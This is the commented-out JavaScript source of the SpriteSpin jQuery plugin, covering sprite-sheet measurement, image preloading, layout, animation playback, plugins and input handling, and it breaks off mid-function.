// (function(global, factory) {
    // typeof exports === 'object' && typeof module !== 'undefined' ? factory(exports) :
        // typeof define === 'function' && define.amd ? define(['exports'], factory) :
        // (factory((global.SpriteSpin = {})));
// }(this, (function(exports) {
    // 'use strict';
// 
    // /**
     // * @internal
     // */
    // var Api = /** @class */ (function() {
        // function Api(data) {
            // this.data = data;
        // }
        // return Api;
    // }());
    // /**
     // * Adds methods to the SpriteSpin api
     // *
     // * @public
     // */
    // function extendApi(methods) {
        // var api = Api.prototype;
        // for (var key in methods) {
            // if (methods.hasOwnProperty(key)) {
                // if (api[key]) {
                    // throw new Error('API method is already defined: ' + key);
                // } else {
                    // api[key] = methods[key];
                // }
            // }
        // }
        // return api;
    // }
// 
    // var $$1 = window.jQuery || window.$;
// 
    // function getCursorPosition(event) {
        // var touches = event.touches;
        // var source = event;
        // // jQuery Event normalization does not preserve the 'event.touches'
        // // try to grab touches from the original event
        // if (event.touches === undefined && event.originalEvent !== undefined) {
            // touches = event.originalEvent.touches;
        // }
        // // get current touch or mouse position
        // if (touches !== undefined && touches.length > 0) {
            // source = touches[0];
        // }
        // return {
            // x: source.clientX || 0,
            // y: source.clientY || 0
        // };
    // }
// 
    // var canvas;
    // var context;
// 
    // function detectionContext() {
        // if (context) {
            // return context;
        // }
        // if (!canvas) {
            // canvas = document.createElement('canvas');
        // }
        // if (!canvas || !canvas.getContext) {
            // return null;
        // }
        // context = canvas.getContext('2d');
        // return context;
    // }
    // /**
     // * Idea taken from https://github.com/stomita/ios-imagefile-megapixel
     // * Detects whether the image has been sub sampled by the browser and does not have its original dimensions.
     // * This method unfortunately does not work for images that have transparent background.
     // */
    // function detectSubsampling(img, width, height) {
        // if (!detectionContext()) {
            // return false;
        // }
        // // sub sampling happens on images above 1 megapixel
        // if (width * height <= 1024 * 1024) {
            // return false;
        // }
        // // set canvas to 1x1 pixel size and fill it with magenta color
        // canvas.width = canvas.height = 1;
        // context.fillStyle = '#FF00FF';
        // context.fillRect(0, 0, 1, 1);
        // // render the image with a negative offset to the left so that it would
        // // fill the canvas pixel with the top right pixel of the image.
        // context.drawImage(img, -width + 1, 0);
        // // check color value to confirm image is covering edge pixel or not.
        // // if color still magenta, the image is assumed to be sub sampled.
        // try {
            // var dat = context.getImageData(0, 0, 1, 1).data;
            // return (dat[0] === 255) && (dat[1] === 0) && (dat[2] === 255);
        // } catch (err) {
            // // avoids cross origin exception for chrome when code runs without a server
            // return false;
        // }
    // }
// 
    // /**
     // *
     // */
    // function getOuterSize(data) {
        // var width = Math.floor(data.width || data.frameWidth || data.target.innerWidth());
        // var height = Math.floor(data.height || data.frameHeight || data.target.innerHeight());
        // return {
            // aspect: width / height,
            // height: height,
            // width: width
        // };
    // }
// 
    // function getComputedSize(data) {
        // var size = getOuterSize(data);
        // if (typeof window.getComputedStyle !== 'function') {
            // return size;
        // }
        // var style = window.getComputedStyle(data.target[0]);
        // if (!style.width) {
            // return size;
        // }
        // size.width = Math.floor(Number(style.width.replace('px', '')));
        // size.height = Math.floor(size.width / size.aspect);
        // return size;
    // }
    // /**
     // *
     // */
    // function getInnerSize(data) {
        // var width = Math.floor(data.frameWidth || data.width || data.target.innerWidth());
        // var height = Math.floor(data.frameHeight || data.height || data.target.innerHeight());
        // return {
            // aspect: width / height,
            // height: height,
            // width: width
        // };
    // }
    // /**
     // *
     // */
    // function getInnerLayout(mode, inner, outer) {
        // // get mode
        // var isFit = mode === 'fit';
        // var isFill = mode === 'fill';
        // var isMatch = mode === 'stretch';
        // // resulting layout
        // var layout = {
            // width: '100%',
            // height: '100%',
            // top: 0,
            // left: 0,
            // bottom: 0,
            // right: 0,
            // position: 'absolute',
            // overflow: 'hidden'
        // };
        // // no calculation here
        // if (!mode || isMatch) {
            // return layout;
        // }
        // // get size and aspect
        // var aspectIsGreater = inner.aspect >= outer.aspect;
        // // mode == original
        // var width = inner.width;
        // var height = inner.height;
        // // keep aspect ratio but fit/fill into container
        // if (isFit && aspectIsGreater || isFill && !aspectIsGreater) {
            // width = outer.width;
            // height = outer.width / inner.aspect;
        // }
        // if (isFill && aspectIsGreater || isFit && !aspectIsGreater) {
            // height = outer.height;
            // width = outer.height * inner.aspect;
        // }
        // // floor the numbers
        // width = Math.floor(width);
        // height = Math.floor(height);
        // // position in center
        // layout.width = width;
        // layout.height = height;
        // layout.top = Math.floor((outer.height - height) / 2);
        // layout.left = Math.floor((outer.width - width) / 2);
        // layout.right = layout.left;
        // layout.bottom = layout.top;
        // return layout;
    // }
// 
    // var img;
    // /**
     // * gets the original width and height of an image element
     // */
    // function naturalSize(image) {
        // // for browsers that support naturalWidth and naturalHeight properties
        // if (image.naturalWidth) {
            // return {
                // height: image.naturalHeight,
                // width: image.naturalWidth
            // };
        // }
        // // browsers that do not support naturalWidth and naturalHeight properties have to fall back to the width and
        // // height properties. However, the image might have a css style applied so width and height would return the
        // // css size. To avoid thet create a new Image object that is free of css rules and grab width and height
        // // properties
        // //
        // // assume that the src has already been downloaded, so no onload callback is needed.
        // img = img || new Image();
        // img.src = image.src;
        // return {
            // height: img.height,
            // width: img.width
        // };
    // }
// 
    // /**
     // * Measures the image frames that are used in the given data object
     // */
    // function measure(images, options) {
        // if (images.length === 1) {
            // return [measureSheet(images[0], options)];
        // } else if (options.framesX && options.framesY) {
            // return measureMutipleSheets(images, options);
        // } else {
            // return measureFrames(images, options);
        // }
    // }
// 
    // function measureSheet(image, options) {
        // var result = { id: 0, sprites: [] };
        // measureImage(image, options, result);
        // var frames = options.frames;
        // var framesX = Number(options.framesX) || frames;
        // var framesY = Math.ceil(frames / framesX);
        // var frameWidth = Math.floor(result.width / framesX);
        // var frameHeight = Math.floor(result.height / framesY);
        // var divisor = result.isSubsampled ? 2 : 1;
        // for (var i = 0; i < frames; i++) {
            // var x = (i % framesX) * frameWidth;
            // var y = Math.floor(i / framesX) * frameHeight;
            // result.sprites.push({
                // id: i,
                // x: x,
                // y: y,
                // width: frameWidth,
                // height: frameHeight,
                // sampledX: x / divisor,
                // sampledY: y / divisor,
                // sampledWidth: frameWidth / divisor,
                // sampledHeight: frameHeight / divisor
            // });
        // }
        // return result;
    // }
// 
    // function measureFrames(images, options) {
        // var result = [];
        // for (var id = 0; id < images.length; id++) {
            // // TODO: optimize
            // // dont measure images with same size twice
            // var sheet = measureSheet(images[id], { frames: 1, framesX: 1, detectSubsampling: options.detectSubsampling });
            // sheet.id = id;
            // result.push(sheet);
        // }
        // return result;
    // }
// 
    // function measureMutipleSheets(images, options) {
        // var result = [];
        // for (var id = 0; id < images.length; id++) {
            // // TODO: optimize
            // // dont measure images with same size twice
            // var sheet = measureSheet(images[id], {
                // frames: undefined,
                // framesX: options.framesX,
                // framesY: options.framesY,
                // detectSubsampling: options.detectSubsampling
            // });
            // sheet.id = id;
            // result.push(sheet);
        // }
        // return result;
    // }
// 
    // function measureImage(image, options, result) {
        // var size = naturalSize(image);
        // result.isSubsampled = options.detectSubsampling && detectSubsampling(image, size.width, size.height);
        // result.width = size.width;
        // result.height = size.height;
        // result.sampledWidth = size.width / (result.isSubsampled ? 2 : 1);
        // result.sampledHeight = size.height / (result.isSubsampled ? 2 : 1);
        // return result;
    // }
// 
    // function findSpecs(metrics, frames, frame, lane) {
        // var spriteId = lane * frames + frame;
        // var sheetId = 0;
        // var sprite = null;
        // var sheet = null;
        // while (true) {
            // sheet = metrics[sheetId];
            // if (!sheet) {
                // break;
            // }
            // if (spriteId >= sheet.sprites.length) {
                // spriteId -= sheet.sprites.length;
                // sheetId++;
                // continue;
            // }
            // sprite = sheet.sprites[spriteId];
            // break;
        // }
        // return { sprite: sprite, sheet: sheet };
    // }
// 
    // function indexOf(element, arr) {
        // for (var i = 0; i < arr.length; i++) {
            // if (arr[i] === element) {
                // return i;
            // }
        // }
    // }
// 
    // function noop() {
        // //
    // }
// 
    // function preload(opts) {
        // var src;
        // var input = opts.source;
        // src = typeof input === 'string' ? [input] : input;
        // // const src: string[] =  ? [opts.source] : opts.source
        // var images = [];
        // var targetCount = (opts.preloadCount || src.length);
        // var onInitiated = opts.initiated || noop;
        // var onProgress = opts.progress || noop;
        // var onComplete = opts.complete || noop;
        // var count = 0;
        // var completed = false;
        // var firstLoaded = false;
        // var tick = function() {
            // count += 1;
            // onProgress({
                // index: indexOf(this, images),
                // loaded: count,
                // total: src.length,
                // percent: Math.round((count / src.length) * 100)
            // });
            // firstLoaded = firstLoaded || (this === images[0]);
            // if (firstLoaded && !completed && (count >= targetCount)) {
                // completed = true;
                // onComplete(images);
            // }
        // };
        // for (var _i = 0, src_1 = src; _i < src_1.length; _i++) {
            // var url = src_1[_i];
            // var img = new Image();
            // // push result
            // images.push(img);
            // // bind logic, dont care about abort/errors
            // img.onload = img.onabort = img.onerror = tick;
            // // begin load
            // img.src = url;
        // }
        // onInitiated(images);
    // }
// 
    // function padNumber(num, length, pad) {
        // var result = String(num);
        // while (result.length < length) {
            // result = String(pad) + result;
        // }
        // return result;
    // }
    // /**
     // * Generates an array of source strings
     // *
     // * @remarks
     // * Takes a template string and generates an array of strings by interpolating {lane} and {frame} placeholders.
     // *
     // * ```
     // * sourceArray('http://example.com/image_{frame}.jpg, { frame: [1, 3], digits: 2 })
     // * // gives:
     // * // [ 'http://example.com/image_01.jpg', 'http://example.com/image_02.jpg', 'http://example.com/image_03.jpg' ]
     // *
     // * sourceArray('http://example.com/image_FRAME.jpg, { frame: [1, 3], digits: 2, framePlacer: 'FRAME' })
     // * // gives:
     // * // [ 'http://example.com/image_01.jpg', 'http://example.com/image_02.jpg', 'http://example.com/image_03.jpg' ]
     // * ```
     // *
     // * @param template - The template string
     // * @param opts - Interpolation options
     // *
     // * @public
     // */
    // function sourceArray(template, opts) {
        // var digits = opts.digits || 2;
        // var lPlacer = opts.lanePlacer || '{lane}';
        // var fPlacer = opts.framePlacer || '{frame}';
        // var fStart = 0;
        // var fEnd = 0;
        // if (opts.frame) {
            // fStart = opts.frame[0];
            // fEnd = opts.frame[1];
        // }
        // var lStart = 0;
        // var lEnd = 0;
        // if (opts.lane) {
            // lStart = opts.lane[0];
            // lEnd = opts.lane[1];
        // }
        // var result = [];
        // for (var lane = lStart; lane <= lEnd; lane += 1) {
            // for (var frame = fStart; frame <= fEnd; frame += 1) {
                // result.push(template
                    // .replace(lPlacer, padNumber(lane, digits, '0'))
                    // .replace(fPlacer, padNumber(frame, digits, '0')));
            // }
        // }
        // return result;
    // }
// 
    // /**
     // * The namespace that is used to bind functions to DOM events and store the data object
     // */
    // var namespace = 'spritespin';
    // /**
     // * Event names that are recognized by SpriteSpin. A module can implement any of these and they will be bound
     // * to the target element on which the plugin is called.
     // */
    // var eventNames = [
        // 'mousedown',
        // 'mousemove',
        // 'mouseup',
        // 'mouseenter',
        // 'mouseover',
        // 'mouseleave',
        // 'mousewheel',
        // 'wheel',
        // 'click',
        // 'dblclick',
        // 'touchstart',
        // 'touchmove',
        // 'touchend',
        // 'touchcancel',
        // 'selectstart',
        // 'gesturestart',
        // 'gesturechange',
        // 'gestureend'
    // ];
    // /**
     // *
     // */
    // var callbackNames = [
        // 'onInit',
        // 'onProgress',
        // 'onLoad',
        // 'onFrameChanged',
        // 'onFrame',
        // 'onDraw',
        // 'onComplete',
        // 'onDestroy'
    // ];
    // /**
     // * Names of events for that the default behavior should be prevented.
     // */
    // var eventsToPrevent = [
        // 'dragstart'
    // ];
    // /**
     // * Default set of SpriteSpin options. This also represents the majority of data attributes that are used during the
     // * lifetime of a SpriteSpin instance. The data is stored inside the target DOM element on which the plugin is called.
     // */
    // var defaults = {
        // source: undefined,
        // width: undefined,
        // height: undefined,
        // frames: undefined,
        // framesX: undefined,
        // lanes: 1,
        // sizeMode: undefined,
        // renderer: 'canvas',
        // lane: 0,
        // frame: 0,
        // frameTime: 40,
        // animate: true,
        // retainAnimate: false,
        // reverse: false,
        // loop: true,
        // stopFrame: 0,
        // wrap: true,
        // wrapLane: false,
        // sense: 1,
        // senseLane: undefined,
        // orientation: 'horizontal',
        // detectSubsampling: true,
        // preloadCount: undefined,
        // touchScrollTimer: [200, 1500],
        // responsive: undefined,
        // plugins: undefined
    // };
// 
    // function noop$1() {
        // // noop
    // }
// 
    // function wrapConsole(type) {
        // return console && console[type] ? function() {
            // var args = [];
            // for (var _i = 0; _i < arguments.length; _i++) {
                // args[_i] = arguments[_i];
            // }
            // return console.log.apply(console, args);
        // } : noop$1;
    // }
    // var log = wrapConsole('log');
    // var warn = wrapConsole('warn');
    // var error = wrapConsole('error');
// 
    // function toArray(value) {
        // return Array.isArray(value) ? value : [value];
    // }
    // /**
     // * clamps the given value by the given min and max values
     // */
    // function clamp(value, min, max) {
        // return (value > max ? max : (value < min ? min : value));
    // }
    // /**
     // *
     // */
    // function wrap(value, min, max, size) {
        // while (value > max) {
            // value -= size;
        // }
        // while (value < min) {
            // value += size;
        // }
        // return value;
    // }
    // /**
     // * prevents default action on the given event
     // */
    // function prevent(e) {
        // e.preventDefault();
        // return false;
    // }
    // /**
     // * Binds on the given target and event the given function.
     // * The SpriteSpin namespace is attached to the event name
     // */
    // function bind(target, event, func) {
        // if (func) {
            // target.bind(event + '.' + namespace, function(e) {
                // func.apply(target, [e, target.spritespin('data')]);
            // });
        // }
    // }
    // /**
     // * Unbinds all SpriteSpin events from given target element
     // */
    // function unbind(target) {
        // target.unbind('.' + namespace);
    // }
    // /**
     // * Checks if given object is a function
     // */
    // function isFunction(fn) {
        // return typeof fn === 'function';
    // }
// 
    // function pixelRatio(context) {
        // var devicePixelRatio = window.devicePixelRatio || 1;
        // var backingStoreRatio = context.webkitBackingStorePixelRatio ||
            // context.mozBackingStorePixelRatio ||
            // context.msBackingStorePixelRatio ||
            // context.oBackingStorePixelRatio ||
            // context.backingStorePixelRatio || 1;
        // return devicePixelRatio / backingStoreRatio;
    // }
// 
// 
// 
    // var _Utils = Object.freeze({
        // $: $$1,
        // getCursorPosition: getCursorPosition,
        // detectSubsampling: detectSubsampling,
        // getOuterSize: getOuterSize,
        // getComputedSize: getComputedSize,
        // getInnerSize: getInnerSize,
        // getInnerLayout: getInnerLayout,
        // measure: measure,
        // findSpecs: findSpecs,
        // naturalSize: naturalSize,
        // preload: preload,
        // sourceArray: sourceArray,
        // noop: noop$1,
        // log: log,
        // warn: warn,
        // error: error,
        // toArray: toArray,
        // clamp: clamp,
        // wrap: wrap,
        // prevent: prevent,
        // bind: bind,
        // unbind: unbind,
        // isFunction: isFunction,
        // pixelRatio: pixelRatio
    // });
// 
    // /**
     // * Applies css attributes to layout the SpriteSpin containers.
     // *
     // * @internal
     // */
    // function applyLayout(data) {
        // // disable selection
        // data.target
            // .attr('unselectable', 'on')
            // .css({
                // width: '',
                // height: '',
                // '-ms-user-select': 'none',
                // '-moz-user-select': 'none',
                // '-khtml-user-select': 'none',
                // '-webkit-user-select': 'none',
                // 'user-select': 'none'
            // });
        // var size = data.responsive ? getComputedSize(data) : getOuterSize(data);
        // var layout = getInnerLayout(data.sizeMode, getInnerSize(data), size);
        // // apply layout on target
        // data.target.css({
            // width: size.width,
            // height: size.height,
            // position: 'relative',
            // overflow: 'hidden'
        // });
        // // apply layout on stage
        // data.stage
            // .css(layout)
            // .hide();
        // if (!data.canvas) {
            // return;
        // }
        // // apply layout on canvas
        // data.canvas.css(layout).hide();
        // // apply pixel ratio on canvas
        // data.canvasRatio = data.canvasRatio || pixelRatio(data.context);
        // if (typeof layout.width === 'number' && typeof layout.height === 'number') {
            // data.canvas[0].width = (layout.width * data.canvasRatio) || size.width;
            // data.canvas[0].height = (layout.height * data.canvasRatio) || size.height;
        // } else {
            // data.canvas[0].width = (size.width * data.canvasRatio);
            // data.canvas[0].height = (size.height * data.canvasRatio);
        // }
        // // width and height must be set before calling scale
        // data.context.scale(data.canvasRatio, data.canvasRatio);
    // }
// 
    // /**
     // * Gets a state object by name.
     // * @internal
     // * @param data - The SpriteSpin instance data
     // * @param name - The name of the state object
     // */
    // function getState(data, name) {
        // data.state = data.state || {};
        // data.state[name] = data.state[name] || {};
        // return data.state[name];
    // }
    // /**
     // * Gets a plugin state object by name.
     // *
     // * @remarks
     // * Plugins should use this method to get or create a state object where they can
     // * store any instance variables.
     // *
     // * @public
     // * @param data - The SpriteSpin instance data
     // * @param name - The name of the plugin
     // */
    // function getPluginState(data, name) {
        // var state = getState(data, 'plugin');
        // state[name] = state[name] || {};
        // return state[name];
    // }
    // /**
     // * Checks whether a flag is set. See {@link flag}.
     // *
     // * @public
     // * @param data - The SpriteSpin instance data
     // * @param key - The name of the flag
     // */
    // function is(data, key) {
        // return !!getState(data, 'flags')[key];
    // }
    // /**
     // * Sets a flag value. See {@link is}.
     // *
     // * @public
     // * @param data - The SpriteSpin instance data
     // * @param key - The name of the flag
     // * @param value - The value to set
     // */
    // function flag(data, key, value) {
        // getState(data, 'flags')[key] = !!value;
    // }
// 
    // /**
     // * Gets the playback state
     // *
     // * @public
     // * @param data - The SpriteSpin instance data
     // */
    // function getPlaybackState(data) {
        // return getState(data, 'playback');
    // }
// 
    // function updateLane(data, lane) {
        // data.lane = data.wrapLane ?
            // wrap(lane, 0, data.lanes - 1, data.lanes) :
            // clamp(lane, 0, data.lanes - 1);
    // }
// 
    // function updateAnimationFrame(data) {
        // data.frame += (data.reverse ? -1 : 1);
        // // wrap the frame value to fit in range [0, data.frames)
        // data.frame = wrap(data.frame, 0, data.frames - 1, data.frames);
        // // stop animation if loop is disabled and the stopFrame is reached
        // if (!data.loop && (data.frame === data.stopFrame)) {
            // stopAnimation(data);
        // }
    // }
// 
    // function updateInputFrame(data, frame) {
        // data.frame = Number(frame);
        // data.frame = data.wrap ?
            // wrap(data.frame, 0, data.frames - 1, data.frames) :
            // clamp(data.frame, 0, data.frames - 1);
    // }
// 
    // function updateAnimation(data) {
        // var state = getPlaybackState(data);
        // if (state.handler) {
            // updateBefore(data);
            // updateAnimationFrame(data);
            // updateAfter(data);
        // }
    // }
// 
    // function updateBefore(data) {
        // var state = getPlaybackState(data);
        // state.lastFrame = data.frame;
        // state.lastLane = data.lane;
    // }
// 
    // function updateAfter(data) {
        // var state = getPlaybackState(data);
        // if (state.lastFrame !== data.frame || state.lastLane !== data.lane) {
            // data.target.trigger('onFrameChanged.' + namespace, data);
        // }
        // data.target.trigger('onFrame.' + namespace, data);
        // data.target.trigger('onDraw.' + namespace, data);
    // }
    // /**
     // * Updates the frame or lane number of the SpriteSpin data.
     // *
     // * @public
     // * @param data - The SpriteSpin instance data
     // * @param frame - The frame number to set
     // * @param lane - The lane number to set
     // */
    // function updateFrame(data, frame, lane) {
        // updateBefore(data);
        // if (frame != null) {
            // updateInputFrame(data, frame);
        // }
        // if (lane != null) {
            // updateLane(data, lane);
        // }
        // updateAfter(data);
    // }
    // /**
     // * Stops the running animation.
     // *
     // * @public
     // * @param data - The SpriteSpin instance data
     // */
    // function stopAnimation(data) {
        // data.animate = false;
        // var state = getPlaybackState(data);
        // if (state.handler != null) {
            // window.clearInterval(state.handler);
            // state.handler = null;
        // }
    // }
    // /**
     // * Starts animation playback if needed.
     // *
     // * @remarks
     // * Starts animation playback if `animate` property is `true` and the animation is not yet running.
     // *
     // * @public
     // * @param data - The SpriteSpin instance data
     // */
    // function applyAnimation(data) {
        // var state = getPlaybackState(data);
        // if (state.handler && (!data.animate || state.frameTime !== data.frameTime)) {
            // stopAnimation(data);
        // }
        // if (data.animate && !state.handler) {
            // state.frameTime = data.frameTime;
            // state.handler = window.setInterval(function() { return updateAnimation(data); }, state.frameTime);
        // }
    // }
    // /**
     // * Starts the animation playback
     // *
     // * @remarks
     // * Starts the animation playback and also sets the `animate` property to `true`
     // *
     // * @public
     // * @param data - The SpriteSpin instance data
     // */
    // function startAnimation(data) {
        // data.animate = true;
        // applyAnimation(data);
    // }
// 
    // var plugins = {};
    // /**
     // * Registers a plugin.
     // *
     // * @remarks
     // * Use this to add custom Rendering or Updating modules that can be addressed with the 'module' option.
     // *
     // * @public
     // * @param name - The name of the plugin
     // * @param plugin - The plugin implementation
     // */
    // function registerPlugin(name, plugin) {
        // if (plugins[name]) {
            // error("Plugin name \"" + name + "\" is already taken");
            // return;
        // }
        // plugin = plugin || {};
        // plugins[name] = plugin;
        // return plugin;
    // }
    // /**
     // * Registers a plugin.
     // *
     // * @public
     // * @deprecated Use {@link registerPlugin} instead
     // * @param name - The name of the plugin
     // * @param plugin - The plugin implementation
     // */
    // function registerModule(name, plugin) {
        // warn('"registerModule" is deprecated, use "registerPlugin" instead');
        // registerPlugin(name, plugin);
    // }
    // /**
     // * Gets an active plugin by name
     // *
     // * @internal
     // * @param name - The name of the plugin
     // */
    // function getPlugin(name) {
        // return plugins[name];
    // }
    // /**
     // * Replaces module names on given SpriteSpin data and replaces them with actual implementations.
     // * @internal
     // */
    // function applyPlugins(data) {
        // fixPlugins(data);
        // for (var i = 0; i < data.plugins.length; i += 1) {
            // var name_1 = data.plugins[i];
            // if (typeof name_1 !== 'string') {
                // continue;
            // }
            // var plugin = getPlugin(name_1);
            // if (!plugin) {
                // error('No plugin found with name ' + name_1);
                // continue;
            // }
            // data.plugins[i] = plugin;
        // }
    // }
// 
    // function fixPlugins(data) {
        // // tslint:disable no-string-literal
        // if (data['mods']) {
            // warn('"mods" option is deprecated, use "plugins" instead');
            // data.plugins = data['mods'];
            // delete data['mods'];
        // }
        // if (data['behavior']) {
            // warn('"behavior" option is deprecated, use "plugins" instead');
            // data.plugins.push(data['behavior']);
            // delete data['behavior'];
        // }
        // if (data['module']) {
            // warn('"module" option is deprecated, use "plugins" instead');
            // data.plugins.push(data['module']);
            // delete data['module'];
        // }
    // }
// 
    // var $$2 = $$1;
    // var counter = 0;
    // /**
     // * Collection of all SpriteSpin instances
     // */
    // var instances = {};
// 
    // function pushInstance(data) {
        // counter += 1;
        // data.id = String(counter);
        // instances[data.id] = data;
    // }
// 
    // function popInstance(data) {
        // delete instances[data.id];
    // }
// 
    // function eachInstance(cb) {
        // for (var id in instances) {
            // if (instances.hasOwnProperty(id)) {
                // cb(instances[id]);
            // }
        // }
    // }
    // var lazyinit = function() {
        // // replace function with a noop
        // // this logic must run only once
        // lazyinit = function() {};
// 
        // function onEvent(eventName, e) {
            // eachInstance(function(data) {
                // for (var _i = 0, _a = data.plugins; _i < _a.length; _i++) {
                    // var module_1 = _a[_i];
                    // if (typeof module_1[eventName] === 'function') {
                        // module_1[eventName].apply(data.target, [e, data]);
                    // }
                // }
            // });
        // }
// 
        // function onResize() {
            // eachInstance(function(data) {
                // if (data.responsive) {
                    // boot(data);
                // }
            // });
        // }
        // var _loop_1 = function(eventName) {
            // $$2(window.document).bind(eventName + '.' + namespace, function(e) {
                // onEvent('document' + eventName, e);
            // });
        // };
        // for (var _i = 0, eventNames_1 = eventNames; _i < eventNames_1.length; _i++) {
            // var eventName = eventNames_1[_i];
            // _loop_1(eventName);
        // }
        // var resizeTimeout = null;
        // $$2(window).on('resize', function() {
            // window.clearTimeout(resizeTimeout);
            // resizeTimeout = window.setTimeout(onResize, 100);
        // });
    // };
    // /**
     // * (re)binds all spritespin events on the target element
     // *
     // * @internal
     // */
    // function applyEvents(data) {
        // var target = data.target;
        // // Clear all SpriteSpin events on the target element
        // unbind(target);
        // // disable all default browser behavior on the following events
        // // mainly prevents image drag operation
        // for (var _i = 0, eventsToPrevent_1 = eventsToPrevent; _i < eventsToPrevent_1.length; _i++) {
            // var eName = eventsToPrevent_1[_i];
            // bind(target, eName, prevent);
        // }
        // // Bind module functions to SpriteSpin events
        // for (var _a = 0, _b = data.plugins; _a < _b.length; _a++) {
            // var plugin = _b[_a];
            // for (var _c = 0, eventNames_2 = eventNames; _c < eventNames_2.length; _c++) {
                // var eName = eventNames_2[_c];
                // bind(target, eName, plugin[eName]);
            // }
            // for (var _d = 0, callbackNames_1 = callbackNames; _d < callbackNames_1.length; _d++) {
                // var eName = callbackNames_1[_d];
                // bind(target, eName, plugin[eName]);
            // }
        // }
        // // bind auto start function to load event.
        // bind(target, 'onLoad', function(e, d) {
            // applyAnimation(d);
        // });
        // // bind all user events that have been passed on initialization
        // for (var _e = 0, callbackNames_2 = callbackNames; _e < callbackNames_2.length; _e++) {
            // var eName = callbackNames_2[_e];
            // bind(target, eName, data[eName]);
        // }
    // }
// 
    // function applyMetrics(data) {
        // if (!data.images) {
            // data.metrics = [];
        // }
        // data.metrics = measure(data.images, data);
        // var spec = findSpecs(data.metrics, data.frames, 0, 0);
        // if (spec.sprite) {
            // // TODO: try to remove frameWidth/frameHeight
            // data.frameWidth = spec.sprite.width;
            // data.frameHeight = spec.sprite.height;
        // }
    // }
    // /**
     // * Runs the boot process.
     // *
     // * @remarks
     // * (re)initializes plugins, (re)initializes the layout, (re)binds events and loads source images.
     // *
     // * @internal
     // */
    // function boot(data) {
        // applyPlugins(data);
        // applyEvents(data);
        // applyLayout(data);
        // data.source = toArray(data.source);
        // data.loading = true;
        // data.target
            // .addClass('loading')
            // .trigger('onInit.' + namespace, data);
        // preload({
            // source: data.source,
            // preloadCount: data.preloadCount,
            // progress: function(progress) {
                // data.progress = progress;
                // data.target.trigger('onProgress.' + namespace, data);
            // },
            // complete: function(images) {
                // data.images = images;
                // data.loading = false;
                // data.frames = data.frames || images.length;
                // applyMetrics(data);
                // applyLayout(data);
                // data.stage.show();
                // data.target
                    // .removeClass('loading')
                    // .trigger('onLoad.' + namespace, data)
                    // .trigger('onFrame.' + namespace, data)
                    // .trigger('onDraw.' + namespace, data)
                    // .trigger('onComplete.' + namespace, data);
            // }
        // });
    // }
    // /**
     // * Creates a new SpriteSpin instance
     // *
     // * @public
     // */
    // function create(options) {
        // var _this = this;
        // var target = options.target;
        // // SpriteSpin is not initialized
        // // Create default settings object and extend with given options
        // var data = $$2.extend(true, {}, defaults, options);
        // // ensure source is set
        // data.source = data.source || [];
        // // ensure plugins are set
        // data.plugins = data.plugins || [
            // '360',
            // 'drag'
        // ];
        // // if image tags are contained inside this DOM element
        // // use these images as the source files
        // target.find('img').each(function() {
            // if (!Array.isArray(data.source)) {
                // data.source = [];
            // }
            // data.source.push($$2(_this).attr('src'));
        // });
        // // build inner html
        // // <div>
        // //   <div class='spritespin-stage'></div>
        // //   <canvas class='spritespin-canvas'></canvas>
        // // </div>
        // target
            // .empty()
            // .addClass('spritespin-instance')
            // .append("<div class='spritespin-stage'></div>");
        // // add the canvas element if canvas rendering is enabled and supported
        // if (data.renderer === 'canvas') {
            // var canvas = document.createElement('canvas');
            // if (!!(canvas.getContext && canvas.getContext('2d'))) {
                // data.canvas = $$2(canvas).addClass('spritespin-canvas');
                // data.context = canvas.getContext('2d');
                // target.append(data.canvas);
                // target.addClass('with-canvas');
            // } else {
                // // fallback to image rendering mode
                // data.renderer = 'image';
            // }
        // }
        // // setup references to DOM elements
        // data.target = target;
        // data.stage = target.find('.spritespin-stage');
        // // store the data
        // target.data(namespace, data);
        // pushInstance(data);
        // return data;
    // }
    // /**
     // * Creates a new SpriteSpin instance, or updates an existing one
     // *
     // * @public
     // */
    // function createOrUpdate(options) {
        // lazyinit();
        // var data = options.target.data(namespace);
        // if (!data) {
            // data = create(options);
        // } else {
            // $$2.extend(data, options);
        // }
        // boot(data);
        // return data;
    // }
    // /**
     // * Destroys the SpriteSpin instance
     // *
     // * @remarks
     // * - stops running animation
     // * - unbinds all events
     // * - deletes the data on the target element
     // *
     // * @public
     // */
    // function destroy(data) {
        // popInstance(data);
        // stopAnimation(data);
        // data.target
            // .trigger('onDestroy', data)
            // .html(null)
            // .attr('style', null)
            // .attr('unselectable', null)
            // .removeClass(['spritespin-instance', 'with-canvas']);
        // unbind(data.target);
        // data.target.removeData(namespace);
    // }
// 
    // /**
     // * Gets the current input state
     // *
     // * @public
     // * @param data - The SpriteSpin instance data
     // */
    // function getInputState(data) {
        // return getState(data, 'input');
    // }
    // /**
     // * Updates the input state using a mous or touch event.
     // *
     // * @public
     // * @param e - The input event
     // * @param data - The SpriteSpin instance data
     // */
    // function updateInput(e, data) {
        // var cursor = getCursorPosition(e);
        // var state = getInputState(data);
        // // cache positions from previous frame
        // state.oldX = state.currentX;
        // state.oldY = state.currentY;
        // state.currentX = cursor.x;
        // state.currentY = cursor.y;
        // // Fix old position.
        // if (state.oldX === undefined || state.oldY === undefined) {
            // state.oldX = state.currentX;
            // state.oldY = state.currentY;
        // }
        // // Cache the initial click/touch position and store the frame number at which the click happened.
        // // Useful for different behavior implementations. This must be restored when the click/touch is released.
        // if (state.startX === undefined || state.startY === undefined) {
            // state.startX = state.currentX;
            // state.startY = state.currentY;
            // state.clickframe = data.frame;
            // state.clicklane = data.lane;
        // }
        // // Calculate the vector from start position to current pointer position.
        // state.dX = state.currentX - state.startX;
        // state.dY = state.currentY - state.startY;
        // // Calculate the vector from last frame position to current pointer position.
        // state.ddX = state.currentX - state.oldX;
        // state.ddY = state.currentY - state.oldY;
        // // Normalize vectors to range [-1:+1]
        // state.ndX = state.dX / data.target.innerWidth();
        // state.ndY = state.dY / data.target.innerHeight();
        // state.nddX = state.ddX / data.target.innerWidth();
        // state.nddY = state.ddY / data.target.innerHeight();
    // }
    // /**
     // * Resets the input state.
     // *
     // * @public
     // */
    // function resetInput(data) {
        // var input = getInputState(data);
        // input.startX = input.startY = undefined;
        // input.currentX = input.currentY = undefined;
        // input.oldX = input.oldY = undefined;
        // input.dX = input.dY = 0;
        // input.ddX = input.ddY = 0;
        // input.ndX = input.ndY = 0;
        // input.nddX = input.nddY = 0;
    // }
// 
    // function extension(option, value) {
        // var $target = $$1(this);
        // if (option === 'data') {
            // return $target.data(namespace);
        // }
        // if (option === 'api') {
            // var data = $target.data(namespace);
            // data.api = data.api || new Api(data);
            // return data.api;
        // }
        // if (option === 'destroy') {
            // return $target.each(function() {
